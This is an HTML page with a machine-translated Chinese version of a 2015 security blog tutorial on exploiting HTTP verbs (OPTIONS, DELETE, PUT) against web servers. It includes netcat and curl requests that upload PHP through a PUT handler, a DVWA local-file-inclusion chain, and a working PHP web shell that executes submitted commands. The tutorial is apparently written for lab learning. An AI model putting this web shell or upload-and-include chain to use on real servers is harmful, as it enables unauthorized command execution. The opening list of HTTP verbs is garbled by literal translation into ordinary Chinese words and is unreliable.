<html>
<head>
<title>Exploiting HTTP Verbs</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用HTTP动词</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-http-verbs-c7b42f365cf4?source=collection_archive---------1-----------------------#2015-06-14">https://infosecwriteups.com/exploiting-http-verbs-c7b42f365cf4?source=collection_archive---------1-----------------------#2015-06-14</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="9825" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">HTTP协议由下列动词或方法组成。</p><ul class=""><li id="406c" class="ko kp it js b jt ju jx jy kb kq kf kr kj ks kn kt ku kv kw bi translated">得到</li><li id="02b2" class="ko kp it js b jt kx jx ky kb kz kf la kj lb kn kt ku kv kw bi translated">头</li><li id="9770" class="ko kp it js b jt kx jx ky kb kz kf la kj lb kn kt ku kv kw bi translated">邮政</li><li id="72a3" class="ko kp it js b jt kx jx ky kb kz kf la kj lb kn kt ku kv kw bi translated">放</li><li id="d772" class="ko kp it js b jt kx jx ky kb kz kf la kj lb kn kt ku kv kw bi translated">删除</li><li id="1557" class="ko kp it js b jt kx jx ky kb kz kf la kj lb kn kt ku kv kw bi translated">连接</li><li id="2938" class="ko kp it js b jt kx jx ky kb kz kf la kj lb kn kt ku kv kw bi translated">选择</li><li id="ce5b" class="ko kp it js b jt kx jx ky kb kz kf la kj lb kn kt ku kv kw bi translated">找到；查出</li></ul><p id="ffd4" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我将展示一些有趣的HTTP动词，它们可以用来闯入服务器。嗯，这些攻击可能非常罕见，但请考虑共享🙂</p><p id="8b3a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">服务器中启用了OPTIONS谓词，它可用于查看所有已配置的HTTP方法。</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="7af9" class="ll lm it lh b gy ln lo l lp lq">% nc localhost 80<br/>OPTIONS / HTTP/1.0</span><span id="a81e" class="ll lm it lh b gy lr lo l lp lq">HTTP/1.1 200 OK<br/>Allow: OPTIONS, TRACE, GET, HEAD, POST<br/>Server: Microsoft-IIS/7.5<br/>Public: OPTIONS, TRACE, GET, HEAD, POST<br/>X-Powered-By: ASP.NET<br/>Date: Sun, 14 Jun 2015 05:31:10 GMT<br/>Connection: close</span></pre><p id="5a0a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">删除动词是一个危险的动词，可能会被误用。如果配置错误，可用于从web服务器上删除资源。</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="49a0" class="ll lm it lh b gy ln lo l lp lq">% nc localhost 80<br/>DELETE  /location/resource HTTP/1.0</span><span id="76d3" class="ll lm it lh b gy lr lo l lp lq">Date: Sun, 14 Jun 2015 05:01:22 GMT<br/>Server: Apache/2.2.3 (CentOS)<br/>X-Powered-By: PHP/5.1.6<br/>Set-Cookie: PHPSESSID=ete39c4b0uk83phvucj1ftbsn5; expires=Mon, 15 Jun 2015 05:01:22 GMT; path=/<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br/>Pragma: no-cache<br/>Connection: close<br/>Content-Type: text/html; charset=UTF-8</span></pre><p id="5ece" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">该动词可用于将资源上传到服务器。如果配置不当，这也是一个危险的动词。比如，假设我们要写“<em class="ls">”&lt;？PHP echo‘Hello World’；？&gt; </em>在新文件中命名为“hello.php”。确保给出正确的有效载荷长度。</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="befa" class="ll lm it lh b gy ln lo l lp lq">%  cat -e hello.php <br/>&lt;?php echo 'Hello World'; ?&gt;$</span><span id="2579" class="ll lm it lh b gy lr lo l lp lq">% wc -m hello.php <br/>29 hello.php</span><span id="d255" class="ll lm it lh b gy lr lo l lp lq">% nc localhost 80<br/>PUT /hello.php HTTP/1.0<br/>Content-Type: text/html<br/>Content-Length: 29</span><span id="a4c5" class="ll lm it lh b gy lr lo l lp lq">&lt;?php echo 'Hello World'; ?&gt;</span></pre><p id="1e39" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">PHP支持PUT动词。这是一个示例程序，它将从PUT请求中接收数据，并将其保存为“<em class="ls"> myfile </em>”。</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="1074" class="ll lm it lh b gy ln lo l lp lq">&lt;?php<br/>    $putdata = fopen("php://input", "r");<br/>    $fp = fopen("myfile", "w");<br/>    while ($data = fread($putdata, 1024)) fwrite($fp, $data);<br/>    fclose($fp);<br/>    fclose($putdata);<br/>?&gt;</span></pre><p id="f8a0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我将把它作为“put.php”保存在web服务器的根目录下。<br/>现在我们可以使用put动词请求“put.php ”,并发送我们的有效负载。</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="ce8d" class="ll lm it lh b gy ln lo l lp lq">% cat -e phpinfo.php <br/>&lt;?php phpinfo(); ?&gt;$</span><span id="88be" class="ll lm it lh b gy lr lo l lp lq">% wc -m phpinfo.php <br/>20 phpinfo.php</span><span id="fca4" class="ll lm it lh b gy lr lo l lp lq">% nc 192.168.1.5 80<br/>PUT /put.php HTTP/1.0<br/>Content-Type: text/html<br/>Content-Length: 20</span><span id="061d" class="ll lm it lh b gy lr lo l lp lq">&lt;?php phpinfo(); ?&gt;<br/>HTTP/1.1 200 OK<br/>Date: Mon, 15 Jun 2015 06:48:16 GMT<br/>Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22<br/>X-Powered-By: PHP/5.4.22<br/>Content-Length: 0<br/>Connection: close<br/>Content-Type: text/html</span></pre><p id="1a27" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在，如果你查看"<em class="ls"> myfile </em>"我们的有效载荷应该写得很好。<br/>假设您有一个本地文件包含情况，在这种情况下，我们可以使用PUT来包含我们新编写的文件。<br/>这是本地文件包含的一个例子。我将用DVWA来演示这一点。</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="160b" class="ll lm it lh b gy ln lo l lp lq">&lt;?php<br/>    echo "File included: ".$_REQUEST["page"]."&amp;lt;br&amp;gt;";<br/>    $file =  $_REQUEST["page"];<br/>    include $file;<br/>?&gt;</span></pre><p id="5ad4" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><code class="fe lt lu lv lh b"><a class="ae lw" href="http://localhost/dvwa/vulnerabilities/fi/?page=" rel="noopener ugc nofollow" target="_blank">http://localhost/dvwa/vulnerabilities/fi/?page=</a>../../../myfile</code></p><figure class="lc ld le lf gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi lx"><img src="../Images/f96106cba92b0f840aecb7d83b9f48b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*MBTeCYuJ9NQyJ815.png"/></div></div></figure><p id="4951" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">假设我们想要上传一个简单的web shell，我们可以像下面这样做😉</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="f20d" class="ll lm it lh b gy ln lo l lp lq">% wc -m shell.php <br/>189 shell.php</span><span id="7e23" class="ll lm it lh b gy lr lo l lp lq">% nc 192.168.1.5 80<br/>PUT /put.php HTTP/1.0<br/>Content-Type: text/html<br/>Content-Length: 189</span><span id="e070" class="ll lm it lh b gy lr lo l lp lq">&lt;?php</span><span id="3fff" class="ll lm it lh b gy lr lo l lp lq">print '&lt;form method="post"&gt;<br/>Command: &lt;input type="text" name="__"&gt;&lt;br&gt;<br/>&lt;input type="submit"&gt;<br/>&lt;/form&gt;';</span><span id="aae9" class="ll lm it lh b gy lr lo l lp lq">if(isset($_POST["__"]))<br/> print '&lt;pre&gt;'.shell_exec($_POST["__"]).'&lt;/pre&gt;';</span><span id="dc20" class="ll lm it lh b gy lr lo l lp lq">?&gt;<br/>HTTP/1.1 200 OK<br/>Date: Mon, 15 Jun 2015 07:39:42 GMT<br/>Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22<br/>X-Powered-By: PHP/5.4.22<br/>Content-Length: 0<br/>Connection: close<br/>Content-Type: text/html</span></pre><p id="8007" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在那之后包括我们的“<em class="ls"> myfile </em>”，你就可以在服务器上执行命令了。</p><figure class="lc ld le lf gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi mf"><img src="../Images/a630b36c0334610b5fd15a4e435d8588.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ZhPKNx5TLmpTH_FI.png"/></div></div></figure><p id="ef98" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">您还可以使用curl通过PUT轻松上传文件。</p><pre class="lc ld le lf gt lg lh li lj aw lk bi"><span id="7601" class="ll lm it lh b gy ln lo l lp lq">% curl <a class="ae lw" href="http://192.168.1.5/put.php" rel="noopener ugc nofollow" target="_blank">http://192.168.1.5/put.php</a> --upload-file shell.php -v<br/>* About to connect() to 192.168.1.5 port 80 (#0)<br/>*   Trying 192.168.1.5...<br/>* connected<br/>* Connected to 192.168.1.5 (192.168.1.5) port 80 (#0)<br/>&gt; PUT /put.php HTTP/1.1<br/>&gt; User-Agent: curl/7.26.0<br/>&gt; Host: 192.168.1.5<br/>&gt; Accept: */*<br/>&gt; Content-Length: 189<br/>&gt; Expect: 100-continue<br/>&gt; <br/>* additional stuff not fine transfer.c:1037: 0 0<br/>* HTTP 1.1 or later with persistent connection, pipelining supported<br/>&lt; HTTP/1.1 100 Continue<br/>* additional stuff not fine transfer.c:1037: 0 0<br/>* We are completely uploaded and fine<br/>* HTTP 1.1 or later with persistent connection, pipelining supported<br/>&lt; HTTP/1.1 200 OK<br/>&lt; Date: Mon, 15 Jun 2015 07:47:44 GMT<br/>&lt; Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22<br/>&lt; X-Powered-By: PHP/5.4.22<br/>&lt; Content-Length: 0<br/>&lt; Content-Type: text/html<br/>&lt; <br/>* Connection #0 to host 192.168.1.5 left intact<br/>* Closing connection #0</span></pre><p id="e753" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">感谢阅读！</p><p id="559e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">【1】<a class="ae lw" href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" rel="noopener ugc nofollow" target="_blank">http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a><br/>【2】<a class="ae lw" href="https://tools.ietf.org/html/rfc7231" rel="noopener ugc nofollow" target="_blank">https://tools.ietf.org/html/rfc7231</a></p></div><div class="ab cl mg mh hx mi" role="separator"><span class="mj bw bk mk ml mm"/><span class="mj bw bk mk ml mm"/><span class="mj bw bk mk ml"/></div><div class="im in io ip iq"><p id="d413" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><em class="ls">原载于2015年6月14日</em><a class="ae lw" href="https://osandamalith.com/2015/06/14/exploiting-http-verbs/" rel="noopener ugc nofollow" target="_blank"><em class="ls">http://osandamalith.com</em></a><em class="ls">。</em></p></div></div>    
</body>
</html>